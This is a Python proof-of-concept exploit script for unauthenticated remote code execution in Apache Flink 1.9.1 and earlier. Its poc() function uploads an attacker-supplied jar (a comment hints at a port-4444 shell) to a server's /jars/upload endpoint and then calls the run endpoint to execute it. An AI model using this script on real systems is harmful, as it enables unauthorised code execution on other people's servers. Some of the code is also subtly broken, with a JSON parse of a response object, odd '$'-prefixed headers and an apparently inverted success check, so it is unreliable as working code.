#coding:utf-8

import requests
import string
import os
import json


name = 'unauth RCE in Apache Flink version <=1.9.1'
version = '1'
vulID = '8081'
author = ['henry']
vulType = 'Remote Code Execution'
references = 'https://twitter.com/jas502n/status/1193869996717297664'
desc = '''The vulneability is caused by unauth visit, causing 
rce via uploading an evil jar file.
MUST REPLACE the JAR_PATH to YOUR OWN PATH
'''
vulDate = '2019-11-13'
createDate = '2019-11-13'
updateDate = '2019-11-1'

appName = 'Apache Flink'
appVersion = '<= 1.9.1'
appPowerLink = 'https://mp.weixin.qq.com/s/ArYCF4jjhy6nkY4ypib-Ag'
samples = ['']

def poc(url):
    url = "http://" + url if "//" not in url else url
    JAR_PATH = "/opt/rce.jar" # 4444
    try:
        res = requests.get(url,timeout=8)
    except:
        return False
        
    # visit home page
    tmp = url+"/jars/upload"
    # data = {
        # 'filename': 'rce.jar'
    # }
    files = {'file': open(JAR_PATH, 'rb')}
    try:
        response = requests.post(tmp, files=files, timeout=8)
    except:
        return False

        
    if response and res.status_code==200:
        # next step: execute jar
        headers = {
        '$Content-Length': '2',
        '$Accept': 'application/json, text/plain, */*',
        '$User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36',
        '$Content-Type': 'application/json;charset=UTF-8',
        '$Accept-Encoding': 'gzip, deflate',
        '$Accept-Language': 'zh-CN,zh;q=0.9',
        '$Connection': 'close',
        }
        data = '{}'
        
        exe_URL = url
        
        try:
            exe_URL = url + "/jars/" +json.loads(response).split("/")[-1] + "/run"
            #POST /jars/a84a1ca6-bce0-4250-9a6c-d596889cf9d6_rce.jar/run
        except:
            return False
            
        httpreq = requests.Session()    

        response2 = httpreq.post(url=exe_URL, headers=headers, data=data, timeout=3)
        
        if "error" not in response2.text and response2.text:  
            return False
            
        else:
            return url
            
    else:
        return False